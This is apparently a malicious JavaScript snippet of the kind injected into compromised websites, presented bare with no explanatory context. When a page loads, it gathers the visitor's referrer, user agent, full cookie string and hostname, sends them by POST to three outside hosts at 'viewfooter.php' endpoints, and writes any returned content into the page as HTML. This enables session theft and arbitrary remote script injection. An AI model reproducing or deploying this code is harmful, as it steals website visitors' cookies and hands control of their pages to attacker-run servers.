const TIMEOUT_MIL = 10000;

e({
    '1': document.referrer,
    '2': navigator.userAgent,
    '3': !!document.cookie,
    '4': document.cookie,
    '5': window.location.hostname
}, [
    'https://wietpoint.nl/viewfooter.php',
    'https://www.hypohypo.cz/viewfooter.php',
    'https://www.bezpeka-shop.com/viewfooter.php'
]);

function params(d) {
    var pd = [];
    for (var k in d) {
        if (d.hasOwnProperty(k)) {
            pd.push(k + '=' + d[k]);
        }
    }
    return pd.join('&');
}

function execute(xhr, hosts, dc, h_pos) {
    if (h_pos >= hosts.length) {
        return;
    }
    xhr.open('POST', hosts[h_pos]);
    xhr.timeout = TIMEOUT_MIL;
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4 && xhr.status == 200) {
            var resp = xhr.responseText;
            if (resp) {
                var an_s = decodeURIComponent(resp).replace(/\+/g, '%20');
                var da = document.createElement('div');
                da.id = 'p';
                da.innerHTML = an_s;
                document.body.appendChild(da);
            }
        } else if (xhr.readyState == 4 && xhr.status == 0) {
            execute(xhr, hosts, dc, ++h_pos);
        }
    };
    xhr.send(dc);
}

function e(d, h) {
    var xhr = null;
    if (!!window.XMLHttpRequest) {
        xhr = new XMLHttpRequest();
    } else if (!!window.ActiveXObject) {
        var xhrs = [
            'Microsoft.XMLHTTP',
            'Msxml2.XMLHTTP',
            'Msxml2.XMLHTTP.3.0',
            'Msxml2.XMLHTTP.6.0'
        ];
        for (var i = 0; i < xhrs.length; i++) {
            try {
                xhr = ActiveXObject(xhrs[i]);
                break;
            }
            catch (e) {
            }
        }
    }
    if (!!xhr) {
        execute(xhr, h, params(d), 0);
    }
}
